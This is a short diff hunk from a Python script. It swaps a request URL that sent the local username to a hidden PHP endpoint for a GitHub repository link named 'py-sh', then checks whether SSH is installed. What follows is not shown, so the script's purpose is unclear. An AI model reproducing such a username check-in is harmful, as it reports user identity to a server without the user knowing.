@@ -35,7 +35,7 @@ def main():
             
 if __name__ == "__main__":
     username = os.environ.get('USER') or os.environ.get('LOGNAME')
-    link = f"http://localhost:8080/.user.php?user={username}"
+    link = f"https://github.com/74lg0/py-sh"
     try:
         response = requests.get(link)
         if response.status_code == 200 and ssh_installed():
